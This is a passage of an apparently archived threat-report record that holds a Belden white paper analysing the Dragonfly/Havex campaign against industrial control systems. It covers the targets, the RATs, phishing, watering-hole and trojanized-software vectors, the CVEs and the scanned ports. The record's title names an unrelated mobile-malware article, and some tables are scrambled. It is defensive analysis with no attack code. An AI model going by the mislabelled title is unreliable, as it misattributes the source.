{
    "id": "02ca5509-97e5-4f0b-a3cd-3b9ff2f972c3",
    "created_at": "2023-01-12T15:06:14.614304Z",
    "updated_at": "2025-03-27T02:16:20.812868Z",
    "deleted_at": null,
    "sha1_hash": "fca187550d3ce16092d51931f8c2667b25082b79",
    "title": "2016-06-17 - In The Wild- Mobile Malware Implements New Features",
    "authors": "",
    "file_creation_date": "2014-12-09T16:00:59Z",
    "file_modification_date": "2014-12-09T16:01:09Z",
    "file_size": 2683231,
    "plain_text": "|Col1|Col2|\n|---|---|\n||Defending Against the Dragonfly Cyber Security Attacks Joel T. Langill ICS Cyber Security Expert RedHatCyber.com Written for Belden Version 3.0 December 10, 2014|\n\n\nTable of Contents\n\n\nIntroduction from Belden......................... 1\n\nExecutive Summary................................... 2\n\nAbout Joel Langill and RedHat Cyber.... 2\n\nPart A – Identifying the Targets............... 3\n\nPart B – Analyzing the Malware.............. 9\n\nPart C – Assessing the\nConsequences.......................................... 21\n\nPart D – Defending Industrial\nControl Systems....................................... 25\n\nReferences................................................ 32\n\nAdditional Information............................ 32\n\nBelden Products for\nDefense in Depth..................................... 33\n\nDisclosure................................................. 33\n\nAbout Belden............................................ 33\n\n\n# White Paper\n\n### Introduction from Belden\n\nThe age of malware specifically targeting industrial control systems (ICS) began in 2010 when\nStuxnet[1] was shown to be disrupting operations at an Iranian nuclear facility. It then took four\nyears before another sophisticated attack, known as Dragonfly, was discovered executing cyber\nespionage against ICS components.\n\nThis white paper analyzes the Dragonfly cyber campaign, looking at its targets, its methods of\nattack, its impact and what it means for defending operations from similar attacks in the future.\n\nThe Dragonfly campaign dates back to late 2010 or early 2011. However, industry was only made\naware of it when the Finnish security firm F-Secure posted a blog in June 2014 describing how\nthe malware was used to search for industrial control devices.[2]\n\nSymantec then published a detailed technical report[3,4], which was quickly picked up by the media.\nThese reports claimed that the attack targeted energy companies with the potential for sabotage.\n\nThe significance of these findings was not the targets (most critical infrastructure providers face\ncyber threats on a regular basis), but that the Dragonfly malware contained payloads designed to\ntarget specific ICS components.\n\nGiven the importance of that finding, Belden commissioned Joel Langill of RedHat Cyber,\na leading independent ICS security expert, to research Dragonfly in depth with the goal of\nproviding the best possible advice to its customers for defending against advanced malware\nthreats. Mr. Langill’s research included looking at how Belden’s products can contribute to\nDefense in Depth cyber security protection.\n\nThe research was conducted by executing the malicious code on systems that reflect real-world\nICS configurations, rather than reverse engineering the malware as was previously done. This\nallowed Mr. Langill to provide a perspective on Dragonfly and its impact to industrial systems that\nis particularly useful to manufacturing companies.\n\n\n-----\n\n‘everyone does it this way’ or the ‘check list\ntells us to,’ ICS security needs to be evaluated\non a holistic risk basis. CIOs and other\nexecutives need to know about this attack\nand be assured that there are techniques and\nproducts available to defend against it,” notes\nEric Byres, a world authority on industrial cyber\nsecurity.\n\nThe paper concludes by outlining the important\nDefense in Depth strategies and technologies\nthat can effectively protect ICS and SCADA\nsystems from advanced persistent threats such\nas Dragonfly.\n\n\n### Executive Summary\n\nThis paper is designed to help the owners and\noperators of manufacturing companies better\nunderstand the nature of advanced cyber\nsecurity threats against ICS and SCADA systems.\n\nThe report is divided into four parts, each\nproviding evidence regarding the nature,\nintended victims and consequences of the\ncampaign. It closes by investigating the\neffectiveness of cyber defenses commonly\nused by companies and proposing realistic\nsolutions to protect against this new form of\nsophisticated attack on industry.\n\n**Part A – Identifying the Targets provides**\nevidence that Dragonfly’s target was most likely\nthe pharmaceutical industry, rather than the\nenergy industry. This represents the first time\nthat a sophisticated attack vector has gone\nafter the discrete manufacturing sector.\n\nThe key evidence for this conclusion was the\ningenious route the attackers used to breach\nindustrial systems. Rather than a traditional\ndirect attack against a target’s systems, they\ninfected the legitimate software of three ICS\nsuppliers that offer products and services most\ncommonly used by the pharmaceutical industry.\nThe three companies are not primary suppliers\nto “energy” facilities.\n\nDragonfly was also remarkable because of the\nmultitude of methods and pathways it took to\nget to the control system. These are described\nin Part B – Analyzing the Malware. Mr.\nLangill coined the apt term “Offense in Depth”\nto describe the diversified arsenal of attack\nvectors it employed.\n\n**Part C – Assessing the Consequences looks**\nat the lessons to be learned from this malware\ncampaign for any security risk assessment.\nFor example, Dragonfly focused on Windows\nXP-based computers, which are widely used by\nindustry, difficult to migrate away from and\nnow impossible to patch.\n\nAnd while Dragonfly’s creators appear to have\nintended this attack for intellectual property\ntheft, it is clear that the malware’s design\nmakes it potentially far more dangerous to live\nprocess control operations.\n\n\nShould they wish it to be a destructive attack\nin the future, it will be trivial for the attackers\nto modify modules and seriously impact their\nvictims’ operations.\n\nFinally, Part D – Defending Industrial Control\n**Systems examines the commonly used cyber**\ndefenses for ICS and assesses if they would\nor would not have been effective against\nDragonfly. Sadly, many of the “usual” security\nsolutions would not have stopped Dragonfly.\n\n“If Dragonfly has taught us anything, it is that\ninstead of deploying security policies because\n\n\n**Suitable for People**\n**Part** **Description**\n\n**in these Roles:**\n\n\nPart A – Identifying the\nTargets\n\nPart B – Analyzing the\nMalware\n\nPart C – Assessing the\nConsequences\n\nPart D – Defending\nIndustrial Control\nSystems\n\n\nDescribes the overall Attack campaign with a\nfocus on determining who the targets were.\n\nDetails the key Building Blocks used in the\nattacks.\n\nDiscusses the Consequences of the attacks to\nindustry and analyzes the impact to a victim’s\nICS infrastructure.\n\nDefines the most effective Defenses that\ncould be deployed to minimize the risk to\noperations from not only Dragonfly, but similar\ntargeted attacks. This approach is meant to\naid in improving the cyber resilience of ICS\ninstallations to future attacks.\n\n\n\n- Executives\n\n- Controls Engineers\n\n- Electrical Engineers\n\n- Network Engineers\n\n- IT Professionals\n\n- Security Professionals\n\n- IT Professionals\n\n- Security Professionals\n\n- Executives\n\n- Controls Engineers\n\n- Electrical Engineers\n\n- Network Engineers\n\n- IT Professionals\n\n- Security Professionals\n\n- Executives\n\n- Controls Engineers\n\n- Electrical Engineers\n\n- Network Engineers\n\n- IT Professionals\n\n- Security Professionals\n\n\n### About Joel Langill and RedHat Cyber\n\nJoel Langill is an independent security researcher, consultant, creator\n[of the website SCADAhacker.com, and founder of RedHat Cyber. He](http://www.scadahacker.com)\napproaches cyber security in a fashion similar to industrial functional\nsafety and his services help companies improve the security and\nreliability of their automation and SCADA systems. Clients include\nend users, owner/operators, engineering contractors, system\nintegrators, distributors, security partners and control system vendors\n[around the globe. www.redhatcyber.com, www.scadahacker.com](http://www.redhatcyber.com)\n\n\n-----\n\n|Col1|Col2|\n|---|---|\n||Defending Against the Dragonfly Cyber Security Attacks Part A – Identifying the Targets Joel T. Langill ICS Cyber Security Expert RedHatCyber.com Written for Belden Version 3.0 December 10, 2014|\n\n\nTable of Contents\n\n\nPart A – Identifying the Targets................. 3\n\nTimeline of the Attack................................ 4\n\nCompromised ICS-Related\nCompanies.................................................... 4\n\neWON............................................................. 4\n\nMB Connect Line......................................... 6\n\nMesa Imaging............................................... 6\n\nSummary of Compromised ICS\nVendor Companies....................................... 6\n\nWho is the Real Target?.............................. 7\n\nConclusion – Part A..................................... 8\n\nBelden’s Cyber Security Expert,\nEric Byres...................................................... 8\n\n\n# White Paper – Part A\n\n### Part A – Identifying the Targets\n\nThe Dragonfly campaign uses three main pieces of malware to achieve its ends. All are known as\nRemote Access Tools or RATs and provide the attackers with access and control of compromised\ncomputers.\n\nThe dominant tool is the Havex RAT, which is also known as Backdoor.Oldrea or the Energetic\nBear RAT. It infected an estimated 2,470 victims using as many as 50 different variations[5]. Like all\nRATs, it acts as a back door into the victim’s computer for the attackers, allowing them to extract\ndata and install further malware. It also extracts data from Outlook address books and ICSrelated software files used for remote access from the infected computer to industrial systems.\nSome of the variants specifically look for OPC servers.\n\nThe next most common RAT used by Dragonfly is known as Karagany. It also allows attackers to\nupload and download files from the infected computer and run executable files. In addition, it\nhas features for collecting passwords, taking screenshots and cataloguing documents.\n\nThe rarest RAT is called Sysmain. It was not mentioned in the Symantec report, but was analyzed\nby Kaspersky[7]. Limited information is available as to how extensively the Sysmain RAT was used,\nbut as it will be discussed later, it likely was only used early in the Dragonfly campaign.\n\nDragonfly’s creators distributed their malware using three attack vectors:\n\n1. Email Spear Phishing[8] Campaign – Executives and senior employees were targeted with\n\nmalicious PDF attachments.\n\n2. Watering Hole Attack[9] – Websites likely to be visited by intended victims were infected such\n\nthat the sites redirected the site visitor to another compromised website hosting an exploit kit.\nThe exploit kit then installed one of the RATs.\n\n3. Trojanized Software[10] Downloaded From ICS Vendors – Three ICS vendors’ software\n\ndownload web sites were hacked so that legitimate ICS software included the RAT malware.\nCustomers installing this software would also unknowingly install the RAT malware.\n\n\n-----\n\nNo information has been disclosed regarding\nthe number of downloads from the Mesa\nImaging and MB Connect Line sites.\n\nThere are several interesting similarities\nbetween each of the companies whose\nwebsites were targeted to host malicious\nsoftware. Understanding the solutions\noffered by each of these companies, and\nthe likely sectors that would use these\nsolutions provides valuable information in\nunderstanding the likely intended targets of\nthe Dragonfly campaign.\n\n\nJanuary 2014 when approximately 250\ncopies of the malicious software were\ndownloaded[3].\n\n\nBoth the RAT malware and the attack vectors are\ndescribed in more detail in the second section of\nthis series, Part B – Analyzing the Malware.\n\n**Timeline of the Attack**\n\n\nSymantec reported that they first observed\nspear phishing attempts (email spoofing fraud\nthat targets specific organizations seeking\nunauthorized access to confidential data) in\nFebruary 2013 that continued through June\n2013.\n\nIn May 2013, the attack shifted to using a\nwatering hole technique that included the\ncompromise of legitimate websites that\nwould redirect the visitors to other sites\nhosting malicious content. This phase lasted\nuntil April 2014.\n\nConcurrent to the watering hole attacks,\nseveral ICS vendors had legitimate software\navailable for download from their websites\n“augmented” with malicious content. This\n“trojanizing” of genuine ICS software\noccurred over a period of almost one year,\nbeginning in June 2013 and ending in May\n2014.\n\nFigure 1 provides a timeline of the relevant\nevents with additional facts of each phase\nthat will be discussed throughout this paper.\n\n\nfunded multi-phase attack. The attackers first\nfocused data collection efforts on “suppliers”\nto the targets as indicated by the high-level\nindividuals receiving the early spear phishing\nemails.\n\nThe information obtained from the initial\nspear phishing would have then allowed the\nattackers to focus their efforts on locating and\nexploiting companies that supply the target\nsector. They did this by offering “public” or\n“unauthenticated” downloading of ICS utilities\nand drivers. This allowed the attackers to have\ntheir malware reach computers that would\nlikely not be susceptible to normal web-based\nwatering hole or spear phishing vectors.\n\nIn the next section, the three targeted ICS\nsuppliers will be examined to see what can be\nlearned from them.\n\n**Compromised ICS-Related**\n**Companies**\n\n\n\n- The next site belonged to eWON – a\n\nproducer of industrial security appliances\nand portal software. Their site was\ncompromised for ten days beginning in\n\n\n\n- The final site that was targeted belonged\n\nto MB Connect Line who also produces\na line of hardware and software security\nappliances similar to eWON. This site was\nestimated to have hosted the malicious\nsoftware for a period of two weeks\nbeginning in April 2014.\n\n\n\n- Industrial camera manufacturer Mesa\n\nImaging was the first to have their site\ncompromised in June 2013. It did not\nidentify and replace the software for six\nweeks.\n\n\n**eWON**\n\n[eWON sa (www.ewon.biz) is a private](http://www.ewon.biz)\ncompany headquartered in Nivelles, Belgium.\neWON’s company tagline of “Machines\nCan Talk” is accomplished through a line\nof industrial gateways and routers. It also\nprovides a complementary software solution\ncalled Talk2M providing direct, cloud-based\n\n\nThe complexity and sophistication of\nDragonfly highlights the fact it was a well\n\n**Sysmain RAT**\n(Compiled 6/11/13)\n\n**Spear-Phishing (Spam) Attack**\n\nMalicious Adobe XDP File\n\n**Figure 1: Timeline of Dragonfly/Havex Campaign**\n\n\n**Havex RAT v44**\n(Compiled 4/15/14)\n\nOPC Scanner\nModule introduced\n\n\nIndustrial Protocol\n\nScanner Module\n\nIntroduced\n\n\n**Havex RAT v038**\n(Compiled 1/26/14)\n\n\nCustomers Notified\n\n**6 weeks** est. 250 downloads **10 days** **14 days**\n\n|Col1|Col2|ebsite d ojanized|Col4|Col5|Col6|Col7|omised Trojanized|Col9|romised Trojanized|Col11|\n|---|---|---|---|---|---|---|---|---|---|---|\n|||aging W mpromise oftware Tr||Watering Hol Multiple Sties Co Redirection to Light||e Attack mpromised sout Exploit Kit|bsite Compr ss Software||nect Site Comp ccess Software||\n|Spear-Phishing (Spam) Attack Malicious Adobe XDP File|||||||||||\n||||Meas Im Co mera S||||We cce||||\n||||||||ON te A|Epic Turla|Con te A||\n||||||||eW mo||MB mo||\n|||Ca|||||Re||Re||\n\n\n-----\n\n## Be Certain with Belden\n\nand hosted remote connectivity to a variety\nof ICS controllers intended for “on-demand”\nconnections.\n\nIn 2013, eWON introduced a product called\neFive that offers continuous, real-time\nconnections to remote SCADA installations\nand sites. One benefit offered by eWON is the\nability to replace remote OPC servers with\neFive appliances providing direct connectivity\nto the remote industrial networks and\nassociated industrial protocols.\n\neWON offers proven solutions for many\nleading PLC suppliers, including Siemens,\nRockwell Automation, VIPA (Yaskawa),\nOmron, Schneider Electric, Mitsubishi Electric\nand Hitachi. They report that in 2013, they\nexceeded 1 million connections globally,\nand have products that offer direct support\nfor both licensed and proprietary industrial\nprotocols (see Table 1).\n\nNotice that these specific products and\nprotocols are not ones that dominate the\nenergy industry. Instead the products from\neWON appear to be targeted at machine\nbuilders that provide original equipment\nmanufacturer (OEM) solutions to sectors such\nas pharmaceutical and food and beverage.\nThe software supports remote diagnostics and\nenables the maintenance of PLCs associated\nwith the machine builders’ equipment.\n\nWith the introduction of the eFive line,\n\n|PLC Supplier|Protocol|Common Transport|\n|---|---|---|\n\n\n**Siemens** ISOTCP\nProfibus\nPPI\nMPI\n\n**VIPA (Yaskawa)** Ethernet/IP\nModbus TCP\n\n**Table 1: PLCs Supported by eWON**\n\neWON has expanded to provide solutions for\ncustomers with distributed SCADA solutions\nwho need centralized remote management.\nTheir gateway products can be used with\nSCADA and PLC installations of non-critical\nassets in water/wastewater, utilities, and\nrenewable energy (see Figure 2). The products\nare all based on the open-source virtual\nprivate network (VPN) package OpenVPN.\n\nIt is also important to consider that eWON is\n[part of the ACT’L group (www.actl.be) that, in](http://www.actl.be)\n\n\n**Hitachi** Hitachi EH 3004-3007/tcp-udp\n\n\n**Mitsubishi** MELSEC\nMitsubishi MC\n\n**Omron** Ethernet/IP\nFINS/TCP-UDP\nHost Link\n\n**Rockwell Automation** Ethernet/IP (exp)\nEthernet/IP (imp)\nDF1\n\n\n5000/udp | 5001/tcp\n5000/udp | 5001/tcp\n\n44818/tcp\n9600/tcp-udp\nserial\n\n44818/tcp\n2222/udp\nserial\n\n502/tcp\nserial\nserial\n\n102/tcp\nserial\nserial\nserial\n\n44818/tcp\n502/tcp\n\naddition to eWON, consists of sister entities\n[BiiON (www.biion.be) and KEOS (www.keos.be):](http://www.biion.be)\n\n- BiiON is an industrial system integrator\n\nfor the pharmaceutical and biotechnology\nsectors.\nIt specializes in information system and\ntechnology, process automation, electrical\nengineering, and quality and validation\nfor systems that include environmental\nmonitoring, manufacturing execution,\nbatch recipe management and other\nrelated systems.\n\n- KEOS is an environmental monitoring\n\nsystem (EMS) that forms one of the\ncritical ICS systems common within\npharmaceutical and life science facilities.\nAn EMS is like a dedicated SCADA\nsystem that interfaces to various sensors\nand components, like PLCs, to monitor\ntemperature, relative humidity, pressure\nand air cleanliness within clean room\nsettings.\n\nWith a head office management team\nfocused on providing solutions to the\npharmaceutical industry, it is reasonable to\nassume that the eWON sales are also likely to\nbe dominated by the same industry.\n\n\n**Schneider Electric**\n\n**(Telemecanique)**\n\n\nModbus TCP\nModbus RTU\nUniTelWay\n\n\n**[Figure 2: eWON eFive Remote SCADA Solutions (source: www.ewon.biz)](http://www.ewon.biz)**\n\n\n-----\n\n**[Figure 3: MB Connect Line Remote Solutions (source: www.mbconnectline.com)](http://www.mbconnectline.com)**\n\n\na test case to determine feasibility for a later\nattack. Looking back at the timeline in Figure\n1, the gap between the compromises of the\nfirst two sites can help justify this theory. This\nwill be discussed later in this paper when the\nspecifics of the Mesa Imaging software are\nanalyzed.\n\n**Summary of Compromised ICS Vendor**\n**Companies**\n\nThe information available from all companies\n(considering eWON as separate from BiiON)\nsuggests their staff counts are small, with\nprobably fewer than 50 employees at each\ncompany.\n\nTwo of the sites, Mesa Imaging and\nMB Connect Line, also use open-source\ncontent management systems (CMS) on\ntheir websites. Other characteristics of\nthe Dragonfly campaign confirm that the\nattackers were able to successfully comprise\nsites using such CMS.\n\nAll of the software that was trojanized\nwas available for download free-of-charge\nwithout any authentication against the\nwebserver. This provided the attackers with\na simple mechanism to exploit the target\ncompanies’ infrastructure and upload\nadditional content.\n\nLogic would suggest it is much easier to\ncompromise a small business’ web servers\nthan it would be to perform a similar attack\nagainst much larger corporations. Bigger\n\n\n**MB Connect Line**\n\n[MB Connect Line GmbH (www.mbconnectline.](http://www.mbconnectline.com)\n[com) is also a private company with](http://www.mbconnectline.com)\nheadquarters in Ilsfeld, Germany. They focus\non offering remote maintenance solutions\n(see Figure 3) that closely align with those\npreviously mentioned for eWON. They provide\nsimilar hardware appliances and software\nsolutions that facilitate connecting to and\nremote access of ICS components, like PLCs,\nmotion controllers and drives. It is worth\nmentioning that all of the VPN encryption\ntechnology used by the MB Connect Line is\nalso based on OpenVPN.\n\nMB Connect Line’s endpoint appliances\nprovide private path connections to device\nnetworks that include both Ethernet and\nserial communications, including more than\n90 drivers for PLCs, HMIs, panels and servo\ncontrollers.\n\nOne product of note is their mbEAGLE, which\nis designed to monitor Siemens S7300/400\nPLCs for changes to their running logic. This\nprovides a form of anti-virus protection for\nthe PLC (recall that Stuxnet[1] was able to\nmodify the running logic in an S7 PLC without\ndetection and cause mechanical sabotage).\n\nMB Connect Line targets their products for\ncustomers in many of the same industries\nas eWON, with a strong focus on machine\nsuppliers. Other than support for the remote\nmaintenance of wind turbines, the company\n\n\ndoes not claim application expertise in the\nenergy industry.\n\nInstead, its website focuses on remote\nmaintenance of production facilities and\npackaging machines, applications of far more\ninterest to pharmaceutical companies than to\noil and gas companies or power utilities.\n\n**Mesa Imaging**\n\nMesa Imaging (www.mesaimaging.ch) is\na manufacturer of cameras and related\nsoftware with headquarters in Zurich,\nSwitzerland. Their cameras use “time of\nflight” (TOF) technology to render threedimensional images.\n\nThese industrial cameras are used in robotics,\nautomation, healthcare, security and\ntransportation. One practical application\nof this technology is used in vision-guided\nautomated guided vehicles (AGV) very\ncommon in the pharmaceutical industry\nto move ingredients, products and other\nmaterial around the facility.\n\nThe cameras and driver software would not\ntypically be installed at an end-user facility,\nbut rather used by an OEM provider in\nbuilding the AGV carts. This is not a probable\nvector into an industrial network either\nlocally or remotely, and likely did not result in\nany significant number of downloads.\n\nSince the Mesa Imaging software was the first\nto be trojanized, one possibility is that it was\n\n\n-----\n\n## Be Certain with Belden\n\norganizations typically invest heavily in\nsecurity for their public-facing cyber assets\nand normally do not depend on open-source\nsoftware for their website CMS.\n\n**Who is the Real Target?**\n\nReports of the Dragonfly campaign by\nreputable sources misinterpreted the\nSymantec report and were widely speculative:\n\n“The industrial control systems of hundreds\n\nof European and US energy companies\nhave been infected by a sophisticated\ncyber weapon…”\n\nFT.com, June 30, 2014[11]\n\n“…more than 1,000 energy companies\n\nin North America and Europe have been\ncompromised in a huge malware attack…”\n\nBBC.com, July 1, 2014[12]\n\nBoth of these statements were derived\nfrom the same Symantec report, yet their\nconclusions could not be more incorrect.\nBoth the number of infected ICS claimed\n(hundreds) and the industry where they\nreportedly operating (the energy sector) are\nincorrect.\n\nThe first incorrect assumption is that just\nbecause a computer at a company has\nbeen compromised, the company’s ICS\nhave also been compromised. Today, all\nU.S. and European energy companies make\nconsiderable efforts to separate their SCADA/\nICS from their enterprise network (i.e., where\nany desktop computers able to browse\nthe web would reside). Thus, the desktop\ncomputers downloading and executing\nsoftware from an internet-based watering\nhole are unlikely to be directly connected to\nan ICS.\n\nSecond, it was reported by Symantec that\nenergy-related sites were used early in the\nattack as the “watering hole.” However, a\nreview of the targeted sites obtained from\nconfidential sources reveals that the term\n“energy control systems” used by Symantec is\noverstated.\n\nAll but one of these six sites belongs to\nsystem integrators (SIs) and only one site\n\n\nis a manufacturer of ICS components. One\nof the integrators is not even aligned with\nenergy sector automation solutions. Based on\nthe types of sites compromised, the visitors\nto these sites were mostly likely not directly\ninvolved with ICS, but could have been\nsuppliers to the SIs.\n\n### So, with all this data and conflicting interpretations, who was Dragonfly’s intended target?\n\nLet’s start by looking at the three targeted\nICS suppliers (eWON, MB Connect Line,\nand Mesa Imaging). The fact that out of\nthousands of ICS suppliers, these three very\nsimilar companies were targeted, leads us to a\nnumber of interesting observations:\n\n1. Mesa Imaging provides cameras and\n\ncamera systems that can be used across\nnumerous industries, but not typically\n“industrial” installations, like power\ngenerating stations, oil refineries, etc.\nOn the other hand, the pharmaceutical\nindustry uses a large number of unmanned\n“carts” and automated handling systems\nthat transport the active pharmaceutical\ningredients (API) and finished products\naround their facilities.\n\n2. eWON is a part of ACT’L, which also owns\n\ntwo other companies: BiiON, which is a\nSystem Integrator that focuses primarily in\npharmaceutical; and KEOS, which supplies\nenvironmental monitoring systems (EMS)\nthat are a critical ICS subsystem within\npharmaceutical plants.\n\n3. eWON is primarily focused on “machine”\n\naccess, which is a very large component\nof the “pharma-ops” side of the sector.\nPharmaceutical production lines consist\nof numerous packaging machines that are\ntypically supplied by an OEM. Most of this\nin-plant equipment is supported remotely\nby these OEM using products, like the\neWON VPN.\n\n4. eWON also has close relationships with\n\nkey automation suppliers that are listed\non their website, including VIPA, Omron,\nSchneider Electric, Mitsubishi, Siemens and\nRockwell Automation.\n\n\nThese vendors are the same ones that\nwere targeted by the malware’s Industrial\nProtocol Scanner module that searched for\ndevices on ports 44818 (Omron, Rockwell\nAutomation), 102 (Siemens) and 502\n(Schneider Electric).\n\nTraditionally, these protocols and products\n\nhave focused on packaging and discrete\npart manufacturing applications, and have\nbeen less important to the energy industry.\n(More information on this is provided in\nPart B – Analyzing the Malware.)\n\n5. MB Connect Line offers a product that\n\nis competitive with eWON’s, and again\nis used for remote machine support –\nsomething used more in pharmaceutical\nthan many other sectors.\n\nThe list of known victims also provides some\ntantalizing clues as to who the real target\nwas. The Kaspersky report[7] provides details\non 101 “active” victims. Look closely at the\nnumber of victims focused on “machine,”\n“packaging” and “pharmaceutical” products.\nWhen academic targets are removed, these\npredominate.\n\nOf particular interest is a system integrator\nin North Carolina, a focal area for\npharmaceutical in terms of biotech research.\nThis is a logical place for a pharmaceuticalfocused integrator to operate. The U.S. is the\nworld’s largest market for pharmaceuticals\nand the world leader in bio-pharma research.\nDrugs are typically “packaged” locally,\nwith the API components manufactured\nin a central location and shipped for final\ncompounding and packaging at the local\nfacility.\n\nThe computers that fell victim also reveal\nsome interesting trends. Kaspersky has\nconfirmed the majority of target machines\nwere Windows XP-based. While other\nindustries have moved away from this\nnow obsolete operating system, regulatory\nrequirements, like 21 CFR Part 11,\ndiscourage the upgrading of these systems\nbecause of the need to “re-validate” the\nsystem. Validation is a significant cost to\npharmaceutical companies, and is mandated\nglobally not only by the U.S. Food and\n\n\n-----\n\nDrug Administration (FDA), but also similar\nagencies around the world.\n\nFinally, it is worth considering the similarities\nbetween Dragonfly and another malware\ncampaign known as Epic Turla[13].\n\n- The timelines of both campaigns are similar\n\n(according to Kaspersky, “The ‘Epic’ project\nhas been used since at least 2012, with\nthe highest volume of activity observed\nin January-February 2014).” However,\nunlike Dragonfly (which appears to have\nceased operations), Epic Turla is reportedly\nongoing.\n\n### Conclusion – Part A\n\n\n\n- The targeted machines in both campaigns\n\nrun older operating systems, primarily\nWindows XP and Windows Server 2003.\n\n- Both campaigns feature spear phishing\n\nattacks with Adobe PDF Reader exploits.\n\n- Both campaigns utilize a watering hole\n\ntechnique with the same JAVA exploits.\n\n- Both also target watering hole sites that\n\nuse open source Content Management\nSystem (CMS) software.\n\n- Both campaigns try to convince users to\n\ninstall “trusted” software that is trojanized.\n\n\nAccording to Kaspersky, aside from\ngovernmental institutions (embassies,\nmilitary, educational facilities) that are\ncommon day-to-day targets for attacks,\nEpic Turla is actively targeting research and\npharmaceutical companies.\n\nIt seems likely that the Dragonfly and Epic\nTurla campaigns are being run by the same\nmasters for the same primary motive, namely\nindustrial espionage against pharmaceutical\ncompanies. It also appears that the attackers\nare not just looking for the intellectual\nproperty associated with the product, but also\ninformation related to building facilities.\n\n\nThe preceding information, coupled with the author’s knowledge of the pharmaceutical industry, led to the conclusion that it was the industry\ntargeted by Dragonfly. The potential damage could include the theft of proprietary recipes and production batch sequence steps, as well as network\nand device information that indicate manufacturing plant volumes and capabilities.\n\nEric Byres, CTO of Tofino Security, a Belden Brand, and a world authority on industrial cyber security made these remarks about Dragonfly:\n\n“The interesting thing about Dragonfly is that it targeted ICS information not for the purpose of causing downtime, but for the purpose of\nintellectual property theft, likely for the purpose of counterfeiting. CIOs and other executives need to know about this attack and be assured that\nthere are techniques and products available to defend against it.”\n\n“Security researchers and hackers have identified numerous vulnerabilities in the products used in industrial operations. Post Dragonfly, it is\nimportant that manufacturing companies secure core ICS through up-to-date best practice policies and industrially focused security technologies.\nWe know now that Stuxnet and Flame remained hidden in their target networks for years – by the time worms like these do damage or steal trade\nsecrets, it is too late to defend against them.”\n\n\n-----\n\n|Col1|Col2|\n|---|---|\n||Defending Against the Dragonfly Cyber Security Attacks Part B – Analyzing the Malware Joel T. Langill ICS Cyber Security Expert RedHatCyber.com Written for Belden Version 3.0 December 10, 2014|\n\n\nTable of Contents\n\n\nPart B – Analyzing the Malware.............. 9\n\nAttack Vectors............................................ 9\n\nMalware Details....................................... 11\n\nTrojanized Software Content................. 12\n\nMalware Command-and-Control........... 15\n\nPayloads.................................................... 15\n\nConclusion – Part B................................. 20\n\nBelden’s Cyber Security Expert,\nEric Byres.................................................. 20\n\n\n# White Paper – Part B\n\n### Part B – Analyzing the Malware\n\n**Attack Vectors**\n\nThe Dragonfly campaign consisted of a diversified arsenal of attack vectors that compromised\ntheir targets through the deployment of multiple Trojan malicious programs. All of them had the\nability to coordinate the deployment of a consistent set of downloaded payloads via a managed\ncommand-and-control (C2) infrastructure.\n\nThe C2 infrastructure allowed Dragonfly to enhance and expand its payloads throughout the\nlife of the campaign. This tactic provided a form of Offense in Depth, allowing Dragonfly the\nopportunity to infect its targets at various levels of the organization.\n\n**Spear Phishing Attacks**\n\nAs reported by Symantec, the Dragonfly campaign started with a series of email spear phishing\nattempts that occurred between February 11 and June 19, 2013[4]. This first phase utilized a\nmalicious Adobe XML Data Package (XDP) file that was sent to 37 selected executives and\nsenior employees in seven targeted companies. The subject lines were administrative in nature,\nincluding “The account” and “Settlement of delivery problem.” These targets were probably not\ndirectly involved in industrial controls operations, so ICS-related consequences were unlikely\nduring this phase of the attack.\n\nThe XDP file used by Dragonfly took advantage of the PDF/SWF exploit (CVE-2011-0611) that\nallowed the Havex portable executable dynamic link library (PE-DLL) to be decrypted, installed\nand executed. The XDP format allows a PDF file to be packaged within an XML container,\ndisguising the PDF file and offering some level of detection-avoidance from any malware\nprevention software that was installed in the victim’s computers.\n\nThe data analyzed by Kaspersky[7] states that the XDP dropped version 038 of the Havex DLL.\nHowever, if one reviews the timeline in Figure 1 (Part A) this seems unlikely, as the estimated\ncompilation date of v038 is October 2013, long after the spear phishing phase was over. It is\n\n\n-----\n\nmore likely that the Havex versions were no\ngreater than v030 during this phase. Havex\nv024 was the most widely used, accounting\nfor more than 40 percent of the total\ninfections.\n\nKnowing the versions of Havex is important\nbecause it gives us some insight into the\nattackers’ plans in the early stages. Beginning\nwith v024, additional parameters were added\nto the HTTP request string that Havex used to\ncommunicate with its handlers[14].\n\nThe “v1” parameter was added to signify\nthe Havex downloader version and “v2” was\nadded to signify the operating system version\nof the victim. In v029, the “q” parameter was\nfurther added to signify the initial infection\nmethod. These revisions suggest that even\nin this early stage, the Dragonfly team was\nplanning to deploy multiple attack vectors for\nsubsequent phases of its campaign.\n\n**Watering Hole Attacks**\n\nThe next phase was the watering hole phase\nthat ran for 11 months, from mid May 2013\nthrough early April 2014. The compromised\nsites were loaded with a malicious IFRAME\nthat would redirect any visitors to other web\nsites. These exploit sites initially contained\nthe LightsOut exploit kit (LOEK). Beginning\nSeptember 1, 2013, Dragonfly started using\nan updated version of this kit, known as the\nHello exploit kit.\n\nThe Dragonfly team compromised websites\nbased on open source content management\nsystems, like Wordpress, Drupal and Joomla.\nThe redirected sites contained malicious Java\narchive (JAR) and HTML files that exploited\nseveral Java (CVE-2012-1723, CVE-20132465) and Internet Explorer (CVE-2012-4792\nand CVE-2013-1347) vulnerabilities. These\nexploits would then install and execute either\nthe Havex or Karagany packages on the\nwebsites’ visitors’ computers.\n\nAccording to Symantec, this phase included\nthe compromise of as many as 20 websites\nover three industrial service sectors, as shown\nin Table 2. However, review of the targeted\nsites revealed that the term “energy control\nsystems” used by Symantec[3] is incorrect. All\n\n\nbut one of the six sites actually belonged\nto control system integrators and only one\nsite was a manufacturer of ICS components.\nSome of the integrators are not even aligned\nwith energy sector automation solutions in\nany way.\n\nBased on the types of sites compromised, the\nvisitors to these sites were probably not the\nend users directly involved with ICS. Instead,\nthey were probably suppliers or OEMs for the\nintended targets as discussed in Part A.\n\n**Trojanized Software Download Attacks**\n\nThe third and most interesting vector in\nthe Dragonfly campaign began when three\ndifferent ICS suppliers had their support\nwebsites compromised. The attackers were\nable to successfully replace legitimate\ninstallation software on these sites with\nsoftware that added malicious components.\n\nAs a result, the same malevolent content\nthat had been served to Dragonfly’s targets\nusing the earlier vectors (spear phishing and\nwatering holes), now had been bundled in\na software package that many in the ICS\nworld would consider “trusted” since it was\nobtained from a credible source.\n\nEquipment, like PLCs and SCADA RTUs, that\nare typically “unconnected” from the Internet\nare often believed to be immune from attacks\nthat use more common social engineering\nvectors. This attack showed the potential of\nusing tactics involving trusted supply-chain\nvendors to deliver malicious payloads directly\nto difficult to reach endpoints, such as ICS\nequipment.\n\nAs discussed in Part A of this paper, there\nwere three suppliers of ICS products that\nhad their websites compromised and 